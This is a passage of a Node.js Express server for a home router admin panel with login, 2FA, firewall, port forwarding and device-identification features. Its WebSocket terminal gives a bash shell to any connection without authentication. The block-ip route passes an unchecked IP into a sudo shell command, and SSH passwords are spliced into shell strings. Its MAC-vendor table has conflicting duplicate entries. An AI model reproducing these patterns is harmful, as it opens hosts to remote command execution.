// ShadowCypher - Router Admin Panel with Mr. Robot Aesthetic
// ============================================================

const express = require('express');
const { exec, spawn } = require('child_process');
const path = require('path');
const os = require('os');
const fs = require('fs');
const http = require('http');
const WebSocket = require('ws');
const session = require('express-session');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { OTP } = require('otplib');
const otp = new OTP();
const QRCode = require('qrcode');

const app = express();
const PORT = 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

let shadowMode = false;

// Minecraft server path
const MC_DIR = '/home/jack/Documents/curseforge/minecraft/Instances/Cobblemon Plus+ The Top Pokemon Adventure in Cobblemon - Fully Optimized - Pokemon Z-A -  Cobblemon 1.7.3 - Pokemon Academy/server';

const server = http.createServer(app);

// ========================
// AUTHENTICATION SYSTEM
// ========================
const USERS_FILE = path.join(__dirname, 'users.json');

function loadUsers() {
    try {
        if (fs.existsSync(USERS_FILE)) {
            return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
        }
    } catch (e) {}
    // Default admin - CHANGE IMMEDIATELY!
    const bcrypt = require('bcryptjs');
    const defaultUsers = [{ username: 'admin', password: bcrypt.hashSync('shadow', 10), role: 'admin' }];
    fs.writeFileSync(USERS_FILE, JSON.stringify(defaultUsers, null, 2));
    return defaultUsers;
}

function saveUsers(users) {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

// Session config - MemoryStore with clearAll for force logout (avoids store.on errors)
const sessionStore = new session.MemoryStore();
sessionStore.clearAll = (cb) => sessionStore.clear(cb);

function getSessionSecret() {
    const secretFile = path.join(__dirname, '.session-secret');
    try {
        if (fs.existsSync(secretFile)) return fs.readFileSync(secretFile, 'utf8').trim();
    } catch (e) {}
    const secret = crypto.randomBytes(32).toString('hex');
    fs.writeFileSync(secretFile, secret, { mode: 0o600 });
    return secret;
}

app.use(session({
    secret: getSessionSecret(),
    store: sessionStore,
    resave: false,
    saveUninitialized: false,
    rolling: true,
    cookie: { secure: false, httpOnly: true, maxAge: 24 * 60 * 60 * 1000 }
}));

// ═══════════ LOGGING ═══════════
const LOG_FILE = path.join(__dirname, 'activity.log');

function log(msg, type = 'INFO') {
    const timestamp = new Date().toISOString();
    const logLine = `[${timestamp}] [${type}] ${msg}\n`;
    try { fs.appendFileSync(LOG_FILE, logLine); } catch(e) {}
    console.log(logLine.trim());
}

app.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        const duration = Date.now() - start;
        if (res.statusCode >= 400) {
            log(`${req.method} ${req.path} -> ${res.statusCode} (${duration}ms)`, 'ERROR');
        }
    });
    next();
});

// Security headers (HSTS, X-Frame-Options, X-Content-Type-Options, CSP)
app.use((req, res, next) => {
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' ws: wss:; frame-ancestors 'self'");
    next();
});

function requireAuth(req, res, next) {
    if (req.session && req.session.user) {
        return next();
    }
    return res.status(401).json({ error: 'Unauthorized', requireLogin: true });
}

// Login rate limit: 5 attempts per 15 min per IP
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5,
    message: { error: 'Too many login attempts. Try again in 15 minutes.' },
    standardHeaders: true,
    legacyHeaders: false
});

// Auth routes
app.post('/api/auth/login', loginLimiter, async (req, res) => {
    const { username, password, totpCode } = req.body;
    if (!username || !password) {
        return res.status(400).json({ error: 'Username and password required' });
    }
    const bcrypt = require('bcryptjs');
    const users = loadUsers();
    const user = users.find(u => u.username === username);
    if (!user || !bcrypt.compareSync(password, user.password)) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    // Require TOTP if user has 2FA enabled
    if (user.totpSecret) {
        if (!totpCode || typeof totpCode !== 'string') {
            return res.status(401).json({ error: '2FA code required', require2FA: true });
        }
        try {
            const valid = otp.verifySync({ secret: user.totpSecret, token: totpCode.trim() });
            if (!valid) {
                return res.status(401).json({ error: 'Invalid 2FA code', require2FA: true });
            }
        } catch (e) {
            return res.status(401).json({ error: 'Invalid 2FA code', require2FA: true });
        }
    }
    req.session.user = { username: user.username, role: user.role };
    res.json({ success: true, user: { username: user.username, role: user.role } });
});

app.post('/api/auth/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

app.post('/api/auth/change-password', requireAuth, async (req, res) => {
    const bcrypt = require('bcryptjs');
    const { currentPassword, newPassword } = req.body;
    if (!currentPassword || !newPassword) {
        return res.status(400).json({ error: 'Current and new password required' });
    }
    if (newPassword.length < 4) {
        return res.status(400).json({ error: 'Password must be at least 4 characters' });
    }
    const users = loadUsers();
    const userIndex = users.findIndex(u => u.username === req.session.user.username);
    if (userIndex === -1) {
        return res.status(404).json({ error: 'User not found' });
    }
    if (!bcrypt.compareSync(currentPassword, users[userIndex].password)) {
        return res.status(401).json({ error: 'Current password incorrect' });
    }
    users[userIndex].password = bcrypt.hashSync(newPassword, 10);
    saveUsers(users);
    res.json({ success: true });
});

// 2FA setup - returns secret + QR data URL, stores secret in session until verified
app.post('/api/auth/2fa/setup', requireAuth, async (req, res) => {
    try {
        const secret = otp.generateSecret();
        req.session.totpSetupSecret = secret;
        const otpauth = otp.generateURI({ issuer: 'ShadowCypher', label: req.session.user.username, secret });
        const qrDataUrl = await QRCode.toDataURL(otpauth);
        res.json({ secret, qrDataUrl });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// 2FA verify - validates code and enables 2FA (persists secret from setup)
app.post('/api/auth/2fa/verify', requireAuth, async (req, res) => {
    const { code } = req.body;
    if (!code) return res.status(400).json({ error: 'Code required' });
    const secret = req.session.totpSetupSecret;
    if (!secret) return res.status(400).json({ error: 'Run 2FA setup first' });
    try {
        const valid = otp.verifySync({ secret, token: String(code).trim() });
        if (!valid) return res.status(401).json({ error: 'Invalid code' });
        const users = loadUsers();
        const userIndex = users.findIndex(u => u.username === req.session.user.username);
        if (userIndex === -1) return res.status(404).json({ error: 'User not found' });
        users[userIndex].totpSecret = secret;
        saveUsers(users);
        delete req.session.totpSetupSecret;
        res.json({ success: true });
    } catch (e) {
        res.status(401).json({ error: 'Invalid code' });
    }
});

// 2FA disable
app.post('/api/auth/2fa/disable', requireAuth, async (req, res) => {
    const { password } = req.body;
    if (!password) return res.status(400).json({ error: 'Password required' });
    const bcrypt = require('bcryptjs');
    const users = loadUsers();
    const userIndex = users.findIndex(u => u.username === req.session.user.username);
    if (userIndex === -1) return res.status(404).json({ error: 'User not found' });
    if (!bcrypt.compareSync(password, users[userIndex].password)) {
        return res.status(401).json({ error: 'Invalid password' });
    }
    delete users[userIndex].totpSecret;
    saveUsers(users);
    res.json({ success: true });
});

// Auth status - include 2FA info
app.get('/api/auth/status', (req, res) => {
    if (req.session && req.session.user) {
        const users = loadUsers();
        const user = users.find(u => u.username === req.session.user.username);
        res.json({
            authenticated: true,
            user: req.session.user,
            has2FA: !!(user && user.totpSecret)
        });
    } else {
        res.json({ authenticated: false });
    }
});

// Force logout all sessions
app.post('/api/auth/logout-all', requireAuth, (req, res) => {
    sessionStore.clearAll(() => {
        res.json({ success: true });
    });
});

// ========================
// KILL SWITCH
// ========================
const KILL_SWITCH_FILE = path.join(__dirname, '.kill-switch');

function isKillSwitchActive() {
    try {
        return fs.existsSync(KILL_SWITCH_FILE);
    } catch (e) { return false; }
}

function setKillSwitchState(active) {
    if (active) {
        fs.writeFileSync(KILL_SWITCH_FILE, '1', { mode: 0o600 });
    } else if (fs.existsSync(KILL_SWITCH_FILE)) {
        fs.unlinkSync(KILL_SWITCH_FILE);
    }
}

app.get('/api/security/kill-switch', (req, res) => {
    res.json({ active: isKillSwitchActive() });
});

app.post('/api/security/kill-switch', requireAuth, async (req, res) => {
    try {
        await run('sudo iptables -N SHADOW_KILL 2>/dev/null || true');
        await run('sudo iptables -F SHADOW_KILL');
        await run('sudo iptables -A SHADOW_KILL -o lo -j RETURN');  // allow loopback so server can respond
        await run('sudo iptables -A SHADOW_KILL -j DROP');
        const outCheck = await run('sudo iptables -C OUTPUT -j SHADOW_KILL 2>/dev/null || echo "not found"');
        if (outCheck === 'not found') {
            await run('sudo iptables -I OUTPUT 1 -j SHADOW_KILL');
        }
        setKillSwitchState(true);
        log('Kill switch ACTIVATED - outbound blocked', 'SECURITY');
        res.json({ success: true, active: true });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/security/kill-switch/reverse', requireAuth, async (req, res) => {
    try {
        await run('sudo iptables -D OUTPUT -j SHADOW_KILL 2>/dev/null || true');
        await run('sudo iptables -F SHADOW_KILL 2>/dev/null || true');
        await run('sudo iptables -X SHADOW_KILL 2>/dev/null || true');
        setKillSwitchState(false);
        log('Kill switch REVERSED - outbound restored', 'SECURITY');
        res.json({ success: true, active: false });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// ========================
// ROUTER INTEGRATION
// ========================
const ROUTER_CONFIG_FILE = path.join(__dirname, 'router_config.json');

function getRouterConfig() {
    try {
        if (fs.existsSync(ROUTER_CONFIG_FILE)) {
            return JSON.parse(fs.readFileSync(ROUTER_CONFIG_FILE, 'utf8'));
        }
    } catch (e) {}
    return { type: 'local', host: '', username: '', password: '', apiKey: '' };
}

function saveRouterConfig(config) {
    fs.writeFileSync(ROUTER_CONFIG_FILE, JSON.stringify(config, null, 2));
}

function runSSH(cmd, routerConfig) {
    return new Promise((resolve, reject) => {
        const sshCmd = `sshpass -p '${routerConfig.password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 ${routerConfig.username}@${routerConfig.host} "${cmd}"`;
        exec(sshCmd, { timeout: 30000 }, (err, stdout, stderr) => {
            if (err && !stdout) return reject(err);
            resolve((stdout || stderr || '').trim());
        });
    });
}

// Dynamic network helpers (no hardcoded wlo1/192.168.1)
async function getPrimaryIface() {
    try {
        const o = await run('ip route | grep default | head -1');
        const m = o.match(/dev\s+(\S+)/);
        return m ? m[1] : null;
    } catch (_) { return null; }
}
async function getWirelessIface() {
    try {
        const iw = await run('iw dev 2>/dev/null | grep Interface | awk \'{print $2}\' | head -1');
        if (iw && iw.trim()) return iw.trim();
        const nm = await run('nmcli -t -f DEVICE,TYPE device status 2>/dev/null | grep wifi | head -1 | cut -d: -f1');
        return (nm && nm.trim()) ? nm.trim() : null;
    } catch (_) { return null; }
}
async function getScanSubnet() {
    try {
        const o = await run('ip route | grep default | head -1');
        const dev = o.match(/dev\s+(\S+)/)?.[1];
        if (!dev) return '192.168.1.0/24';
        const addr = await run(`ip -4 addr show dev ${dev} 2>/dev/null | grep inet`);
        const m = addr.match(/inet\s+(\d+\.\d+\.\d+\.\d+)\/(\d+)/);
        if (m) return m[1] + '/' + m[2];
        const gw = o.match(/(\d+\.\d+\.\d+)\.\d+/)?.[1];
        return gw ? gw + '.0/24' : '192.168.1.0/24';
    } catch (_) { return '192.168.1.0/24'; }
}
async function getDefaultGateway() {
    try {
        const o = await run('ip route | grep default | head -1');
        const m = o.match(/via\s+(\d+\.\d+\.\d+\.\d+)/);
        return m ? m[1] : '192.168.1.1';
    } catch (_) { return '192.168.1.1'; }
}

// Router config endpoints
app.get('/api/router/config', (req, res) => {
    const config = getRouterConfig();
    // Don't send password
    res.json({ 
        type: config.type, 
        host: config.host, 
        username: config.username, 
        hasPassword: !!config.password,
        apiKey: config.apiKey ? '***set***' : ''
    });
});

app.post('/api/router/config', requireAuth, (req, res) => {
    const { type, host, username, password, apiKey } = req.body;
    const config = getRouterConfig();
    if (type) config.type = type;
    if (host) config.host = host;
    if (username) config.username = username;
    if (password) config.password = password;
    if (apiKey) config.apiKey = apiKey;
    saveRouterConfig(config);
    res.json({ success: true });
});

// Router status based on type
app.get('/api/router/status', async (req, res) => {
    const config = getRouterConfig();
    
    if (config.type === 'local') {
        // Local machine acting as router
        try {
            const gw = await run('ip route | grep default | awk \'{print $3}\'');
            const iface = await run('ip route | grep default | awk \'{print $5}\'');
            res.json({ 
                type: 'local', 
                gateway: gw.trim(), 
                interface: iface.trim(),
                mode: 'This machine'
            });
        } catch (e) {
            res.json({ type: 'local', error: e.message });
        }
    } else if (config.type === 'openwrt') {
        // OpenWrt router via SSH
        try {
            const [uptime, load, mem] = await Promise.all([
                runSSH('cat /proc/uptime', config),
                runSSH('cat /proc/loadavg', config),
                runSSH('free -m | grep Mem', config)
            ]);
            res.json({ 
                type: 'openwrt', 
                host: config.host,
                uptime: uptime.split(' ')[0],
                load: load.split(' ').slice(0,3).join(' '),
                memory: mem
            });
        } catch (e) {
            res.json({ type: 'openwrt', error: e.message });
        }
    } else if (config.type === 'pfsense') {
        // pfSense via API
        try {
            const [status, wan] = await Promise.all([
                runSSH('pfctl -si', config),
                runSSH('ifconfig | grep -A1 em0', config)
            ]);
            res.json({ type: 'pfsense', status: status.substring(0, 500), wan: wan.substring(0, 200) });
        } catch (e) {
            res.json({ type: 'pfsense', error: e.message });
        }
    } else {
        res.json({ type: 'none', message: 'No router configured' });
    }
});

// Router port forwarding (local or remote)
app.get('/api/router/portforward', async (req, res) => {
    const config = getRouterConfig();
    
    try {
        if (config.type === 'local') {
            const o = await run('sudo iptables -t nat -L PREROUTING -n -v --line-numbers 2>/dev/null||echo ""');
            const rules = [];
            for (const l of o.split('\n').slice(2)) {
                const m = l.match(/^\s*(\d+).*DNAT\s+(tcp|udp).*dpt:(\d+)\s+to:([\d.]+):(\d+)/);
                if (m) rules.push({ num: m[1], protocol: m[2], extPort: m[3], intIp: m[4], intPort: m[5], source: 'local' });
            }
            res.json({ source: 'local', rules });
        } else if (config.type === 'openwrt') {
            const o = await runSSH('uci show firewall', config);
            res.json({ source: 'openwrt', config: o });
        }
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/router/portforward', requireAuth, async (req, res) => {
    const config = getRouterConfig();
    const { extPort, intIp, intPort, protocol = 'tcp' } = req.body;
    
    const port = parseInt(extPort, 10);
    const intP = parseInt(intPort, 10);
    
    if (!port || port < 1 || port > 65535 || !intP || intP < 1 || intP > 65535) {
        return res.status(400).json({ error: 'Invalid ports' });
    }
    if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(intIp)) {
        return res.status(400).json({ error: 'Invalid internal IP' });
    }

    try {
        if (config.type === 'local') {
            const prot = protocol === 'udp' ? 'udp' : 'tcp';
            await run(`sudo iptables -t nat -A PREROUTING -p ${prot} --dport ${port} -j DNAT --to-destination ${intIp}:${intP}`);
            await run(`sudo iptables -A FORWARD -p ${prot} -d ${intIp} --dport ${intP} -j ACCEPT 2>/dev/null||true`);
            res.json({ success: true, source: 'local' });
        } else if (config.type === 'openwrt') {
            const name = `portfwd_${port}`;
            await runSSH(`uci add firewall redirect`, config);
            await runSSH(`uci set firewall.${name}=redirect`, config);
            await runSSH(`uci set firewall.${name}.target='DNAT'`, config);
            await runSSH(`uci set firewall.${name}.src='wan'`, config);
            await runSSH(`uci set firewall.${name}.dest='lan'`, config);
            await runSSH(`uci set firewall.${name}.proto='${protocol}'`, config);
            await runSSH(`uci set firewall.${name}.src_dport='${port}'`, config);
            await runSSH(`uci set firewall.${name}.dest_ip='${intIp}'`, config);
            await runSSH(`uci set firewall.${name}.dest_port='${intP}'`, config);
            await runSSH('uci commit firewall && /etc/init.d/firewall reload', config);
            res.json({ success: true, source: 'openwrt' });
        }
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Router firewall rules
app.get('/api/router/firewall', async (req, res) => {
    const config = getRouterConfig();
    
    try {
        if (config.type === 'local') {
            const o = await run('sudo iptables -L INPUT -n --line-numbers 2>/dev/null||echo ""');
            const rules = [];
            for (const l of o.split('\n').slice(2)) {
                const p = l.trim().split(/\s+/);
                if (p.length >= 5) {
                    rules.push({ num: p[0], target: p[1], protocol: p[2], source: p[4], destination: p[5] || '*' });
                }
            }
            res.json({ source: 'local', rules });
        } else if (config.type === 'openwrt') {
            const o = await runSSH('iptables -L INPUT -n --line-numbers', config);
            res.json({ source: 'openwrt', rules: o });
        }
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/router/firewall/block-ip', requireAuth, async (req, res) => {
    const config = getRouterConfig();
    const { ip } = req.body;
    
    if (!ip) return res.status(400).json({ error: 'No IP' });
    
    try {
        if (config.type === 'local') {
            await run(`sudo iptables -I INPUT -s ${ip} -j DROP`);
        } else if (config.type === 'openwrt') {
            await runSSH(`uci add firewall rule`, config);
            await runSSH(`uci set firewall.@rule[-1].name='Block-${ip}'`, config);
            await runSSH(`uci set firewall.@rule[-1].src='wan'`, config);
            await runSSH(`uci set firewall.@rule[-1].dest_ip='${ip}'`, config);
            await runSSH(`uci set firewall.@rule[-1].target='DROP'`, config);
            await runSSH('uci commit firewall', config);
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// ========================
// WEBSOCKET TERMINAL
// ========================
const wss = new WebSocket.Server({ server, path: '/ws/terminal' });

wss.on('connection', (ws) => {
    const shell = spawn('bash', [], { env: { ...process.env, TERM: 'xterm-256color' } });
    shell.stdout.on('data', d => ws.send(d.toString()));
    shell.stderr.on('data', d => ws.send(d.toString()));
    ws.on('message', msg => shell.stdin.write((Buffer.isBuffer(msg) ? msg.toString() : msg) + '\n'));
    ws.on('close', () => shell.kill());
    shell.on('exit', () => ws.close());
});

// Utility functions
function run(cmd, timeout) {
    const extraPath = process.env.HOME + '/go/bin:/usr/local/bin:/usr/sbin:/sbin';
    const env = { ...process.env, PATH: extraPath + ':' + process.env.PATH };
    return new Promise((resolve, reject) => {
        exec(cmd, { timeout: timeout || 60000, maxBuffer: 10485760, env }, (err, stdout, stderr) => {
            if (err && !stdout && !stderr) return reject(err);
            resolve((stdout || stderr || '').trim());
        });
    });
}

function fmt(b) { 
    if (b >= 1073741824) return (b / 1073741824).toFixed(2) + ' GB'; 
    if (b >= 1048576) return (b / 1048576).toFixed(1) + ' MB'; 
    if (b >= 1024) return (b / 1024).toFixed(0) + ' KB'; 
    return b + ' B'; 
}

function fmtR(r) { 
    if (r >= 1048576) return (r / 1048576).toFixed(1) + ' MB/s'; 
    if (r >= 1024) return (r / 1024).toFixed(1) + ' KB/s'; 
    return r.toFixed(0) + ' B/s'; 
}

// CPU tracking
const cpuHist = []; 
let prevCpu = getCpu();
function getCpu() { 
    const c = os.cpus(); 
    let i = 0, t = 0; 
    for (const u of c) { 
        for (const k in u.times) t += u.times[k]; 
        i += u.times.idle; 
    } 
    return { idle: i / c.length, total: t / c.length }; 
}
setInterval(() => { 
    const c = getCpu(); 
    const u = c.total - prevCpu.total > 0 ? ((1 - (c.idle - prevCpu.idle) / (c.total - prevCpu.total)) * 100) : 0; 
    cpuHist.push(parseFloat(u.toFixed(1))); 
    if (cpuHist.length > 120) cpuHist.shift(); 
    prevCpu = c; 
}, 2000);

// Bandwidth tracking
let prevBw = {}, prevBwT = Date.now();
function readDev() { 
    const r = {}; 
    try {
        for (const l of fs.readFileSync('/proc/net/dev', 'utf8').split('\n').slice(2)) { 
            const p = l.trim().split(/[\s:]+/); 
            if (p.length >= 10 && p[0] !== 'lo') r[p[0]] = { rx: parseInt(p[1]), tx: parseInt(p[9]) }; 
        }
    } catch(e) {}
    return r; 
}
prevBw = readDev();

// ========================
// API ROUTES
// ========================

// Overview
app.get('/api/overview', async (req, res) => {
    try {
        const [pub, up, host, load, cpu, kern] = await Promise.all([
            run('curl -4 -s --max-time 4 ifconfig.me 2>/dev/null||echo N/A'),
            run('uptime -p'),
            run('hostname'),
            run('cat /proc/loadavg'),
            run('lscpu 2>/dev/null|grep "Model name"|head -1|sed "s/.*: *//"'),
            run('uname -r')
        ]);
        const ifaces = os.networkInterfaces(), lips = []; 
        for (const [n, a] of Object.entries(ifaces)) 
            for (const x of a) if (!x.internal && x.family === 'IPv4') lips.push({ interface: n, ip: x.address, mac: x.mac });
        const lp = load.split(' '), cu = cpuHist.length > 0 ? cpuHist[cpuHist.length - 1] : 0;
        res.json({
            publicIp: pub, localIps: lips, hostname: host, uptime: up, cpuModel: cpu, cpuUsage: cu.toFixed(0), kernelVersion: kern, 
            load: { m1: lp[0], m5: lp[1], m15: lp[2] },
            totalMem: (os.totalmem() / 1073741824).toFixed(1) + ' GB', freeMem: (os.freemem() / 1073741824).toFixed(1) + ' GB', usedMemPercent: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(0),
            cpus: os.cpus().length, platform: os.platform(), arch: os.arch()
        });
    } catch (e) { res.status(500).json({ error: e.message }) }
});

app.get('/api/cpu-history', (_, res) => res.json(cpuHist));

// MAC Vendor Lookup for device identification
const MAC_VENDORS = {
    // Apple
    'A4:83:E7': 'Apple', 'F0:18:98': 'Apple', '3C:06:30': 'Apple', '60:F8:1D': 'Apple', '68:A8:6D': 'Apple',
    'F0:DB:E2': 'Apple', 'DC:2B:2A': 'Apple', 'E8:80:2E': 'Apple', 'B8:17:C2': 'Apple', '20:C9:D0': 'Apple',
    // Samsung
    'B8:5A:73': 'Samsung', '8C:F5:A3': 'Samsung', '9C:02:98': 'Samsung', 'D0:17:C2': 'Samsung', '78:25:AD': 'Samsung',
    '00:1A:8A': 'Samsung', 'A8:06:00': 'Samsung', 'E4:12:1D': 'Samsung', '00:07:AB': 'Samsung', '30:CD:A7': 'Samsung',
    // Google
    'F4:F5:D8': 'Google', '94:EB:2C': 'Google', '54:60:09': 'Google', '00:1A:11': 'Google', 'F4:F5:E8': 'Google',
    // Amazon
    '0C:47:C9': 'Amazon', '34:D2:70': 'Amazon', '38:F7:3D': 'Amazon', '50:DC:E7': 'Amazon', 'A0:02:DC': 'Amazon',
    '68:37:E9': 'Amazon', '68:54:FD': 'Amazon', '50:5B:C2': 'Amazon', 'F0:27:2D': 'Amazon', '00:FC:8B': 'Amazon',
    // Microsoft
    '3C:83:75': 'Microsoft', 'B4:0E:DE': 'Microsoft', '28:18:78': 'Microsoft', 'DC:B4:C4': 'Microsoft', '7C:1E:52': 'Microsoft',
    // Intel
    '3C:A9:F4': 'Intel', '00:1E:67': 'Intel', '00:1F:3B': 'Intel', '00:22:FA': 'Intel', '00:24:D7': 'Intel',
    '00:26:C6': 'Intel', '00:26:C7': 'Intel', 'DC:53:7C': 'Intel', '48:45:20': 'Intel', 'AC:7B:A1': 'Intel',
    // Dell
    '18:03:73': 'Dell', '18:A9:9B': 'Dell', '18:66:DA': 'Dell', '18:DB:F2': 'Dell', '20:47:47': 'Dell',
    '24:6E:96': 'Dell', '34:17:EB': 'Dell', '44:A8:42': 'Dell', '48:4D:7E': 'Dell', '50:9A:4C': 'Dell',
    // HP
    '00:1E:0B': 'HP', '00:1F:29': 'HP', '00:21:5A': 'HP', '00:22:64': 'HP', '00:24:81': 'HP',
    '00:25:B3': 'HP', '00:26:55': 'HP', '00:30:C1': 'HP', '18:A9:05': 'HP', '38:63:BB': 'HP',
    // Cisco
    '00:17:DF': 'Cisco', '00:1B:2B': 'Cisco', '00:1C:10': 'Cisco', '00:1D:45': 'Cisco', '00:1E:13': 'Cisco',
    '00:1F:6E': 'Cisco', '00:22:55': 'Cisco', '00:23:04': 'Cisco', '00:23:5A': 'Cisco', '00:24:14': 'Cisco',
    // NETGEAR
    '20:0C:C8': 'NETGEAR', '28:C6:8E': 'NETGEAR', '2C:B0:5D': 'NETGEAR', '30:46:9A': 'NETGEAR', '44:94:FC': 'NETGEAR',
    '6C:B0:CE': 'NETGEAR', '84:1B:5E': 'NETGEAR', '9C:3D:CF': 'NETGEAR', 'A0:21:B7': 'NETGEAR', 'A4:2B:B0': 'NETGEAR',
    // TP-Link
    '14:CC:20': 'TP-Link', '14:CF:92': 'TP-Link', '18:A6:F7': 'TP-Link', '1C:FA:68': 'TP-Link', '30:B5:C2': 'TP-Link',
    '50:3E:AA': 'TP-Link', '54:C8:0F': 'TP-Link', '5C:63:BF': 'TP-Link', '60:E3:27': 'TP-Link', '64:66:B3': 'TP-Link',
    // Raspberry Pi
    'B8:27:EB': 'Raspberry Pi', 'DC:A6:32': 'Raspberry Pi', 'E4:5F:01': 'Raspberry Pi', '28:CD:C1': 'Raspberry Pi',
    // NVIDIA
    '00:1E:75': 'NVIDIA', '00:25:00': 'NVIDIA', '00:26:DA': 'NVIDIA', '00:4E:AF': 'NVIDIA', '48:B0:2D': 'NVIDIA',
    // Roku
    '2C:E4:09': 'Roku', '3C:A7:3B': 'Roku', '84:EA:ED': 'Roku', '88:DE:A9': 'Roku', 'AC:3A:7A': 'Roku',
    // Amazon Echo/Spot
    '00:FC:8B': 'Amazon Echo', '34:D2:70': 'Amazon Echo', '38:F7:3D': 'Amazon Echo', '50:DC:E7': 'Amazon Echo',
    // Apple TV
    'A4:5E:60': 'Apple TV', '9C:20:7B': 'Apple TV', 'B8:09:8A': 'Apple TV', 'C8:69:CD': 'Apple TV',
    // Chromecast
    '00:1A:11': 'Chromecast', 'F4:F5:D8': 'Chromecast', 'F4:F5:E8': 'Chromecast', '94:EB:2C': 'Chromecast',
    // PlayStation
    '00:04:4B': 'PlayStation', '00:19:C5': 'PlayStation', '00:19:D5': 'PlayStation', '00:1D:D8': 'PlayStation',
    '00:1F:A4': 'PlayStation', '00:1F:A7': 'PlayStation', '00:24:8D': 'PlayStation', '00:26:AB': 'PlayStation',
    // Xbox
    '00:0D:3A': 'Xbox', '00:15:5D': 'Xbox', '00:17:AB': 'Xbox', '00:1D:D8': 'Xbox', '00:22:48': 'Xbox',
    // Nintendo
    '00:19:1D': 'Nintendo', '00:19:FD': 'Nintendo', '00:1B:7A': 'Nintendo', '00:1B:EA': 'Nintendo', '00:1C:BE': 'Nintendo',
    '00:1D:BC': 'Nintendo', '00:1E:35': 'Nintendo', '00:1F:32': 'Nintendo', '00:1F:C5': 'Nintendo', '00:21:47': 'Nintendo',
    // Smart TVs - LG
    '00:1E:75': 'LG TV', '00:22:A7': 'LG TV', '00:24:83': 'LG TV', '00:25:E9': 'LG TV', '00:26:E2': 'LG TV',
    // Smart TVs - Samsung
    '00:07:AB': 'Samsung TV', '00:1A:8A': 'Samsung TV', '00:21:D1': 'Samsung TV', '00:21:D2': 'Samsung TV',
    '00:23:99': 'Samsung TV', '00:23:D6': 'Samsung TV', '00:23:D7': 'Samsung TV', '00:24:54': 'Samsung TV',
    // Smart TVs - Sony
    '00:04:1F': 'Sony TV', '00:13:A9': 'Sony TV', '00:18:13': 'Sony TV', '00:1D:28': 'Sony TV', '00:1E:45': 'Sony TV',
    // Smart TVs - Vizio
    '00:1E:C2': 'Vizio TV', '00:1F:74': 'Vizio TV', '00:24:5A': 'Vizio TV', '00:26:F2': 'Vizio TV',
    // Smart Things/Gateway
    '00:12:FB': 'SmartThings', '00:17:88': 'SmartThings', '00:1D:6F': 'SmartThings', '00:26:5D': 'SmartThings',
    // Hue Bridge
    '00:17:88': 'Philips Hue', 'EC:B5:FA': 'Philips Hue', '00:1B:63': 'Philips Hue',
    // Sonos
    '00:0E:58': 'Sonos', '00:15:11': 'Sonos', '00:1A:D2': 'Sonos', '00:1B:2D': 'Sonos', '00:1E:58': 'Sonos',
    '00:1F:33': 'Sonos', '00:1F:5F': 'Sonos', '00:21:E8': 'Sonos', '00:22:4C': 'Sonos',
    // Nest
    '18:B4:57': 'Nest', '64:16:66': 'Nest', '64:B7:08': 'Nest', '94:94:26': 'Nest',
    // Ring
    '00:1D:DF': 'Ring', '2C:E4:09': 'Ring', '84:EA:ED': 'Ring', '8C:C8:CD': 'Ring',
    // August Lock
    '18:0B:52': 'August', '18:0E:95': 'August', '70:5A:0F': 'August', '84:2B:2B': 'August',
    // Yale Lock
    '00:0B:98': 'Yale', '00:12:1A': 'Yale', '00:17:6D': 'Yale',
    // Honeywell
    '00:1E:2A': 'Honeywell', '00:1F:3F': 'Honeywell', '00:24:A3': 'Honeywell',
    // Ecobee
    '10:91:34': 'Ecobee', '18:B4:30': 'Ecobee', '30:8D:99': 'Ecobee',
    // Philips Hue
    '00:17:88': 'Philips Hue', 'EC:B5:FA': 'Philips Hue',
    // Lutron
    '00:1D:6F': 'Lutron', '00:23:99': 'Lutron',
    // Smart Plugs
    '50:C7:BF': 'Smart Plug', 'B4:E8:42': 'Smart Plug', 'C0:C1:C0': 'Smart Plug', 'EC1A:59': 'Smart Plug',
    // Unknown common
    '00:1A:2B': 'Unknown', '00:1D:E1': 'Unknown', '00:22:AA': 'Unknown'
};

// Device type inference based on vendor and hostname
function getDeviceInfo(mac, hostname) {
    if (!mac) return { type: 'Unknown', vendor: 'Unknown', icon: '❓' };
    
    const macPrefix = mac.substring(0, 8).toUpperCase();
    const vendor = MAC_VENDORS[macPrefix] || 'Unknown';
    
    const h = (hostname || '').toLowerCase();
    
    // Smart home / IoT detection
    if (h.includes('echo') || h.includes('alexa') || vendor === 'Amazon Echo') return { type: 'Smart Speaker', vendor, icon: '🔊' };
    if (h.includes('chromecast') || vendor === 'Chromecast') return { type: 'Smart TV', vendor, icon: '📺' };
    if (h.includes('roku') || vendor === 'Roku') return { type: 'Streaming', vendor, icon: '📺' };
    if (h.includes('apple-tv') || h.includes('appletv') || vendor === 'Apple TV') return { type: 'Streaming', vendor, icon: '🍎' };
    if (h.includes('nest') || vendor === 'Nest') return { type: 'Smart Thermostat', vendor, icon: '🌡️' };
    if (h.includes('ring') || vendor === 'Ring') return { type: 'Smart Camera', vendor, icon: '🔔' };
    if (h.includes('hue') || vendor === 'Philips Hue') return { type: 'Smart Light', vendor, icon: '💡' };
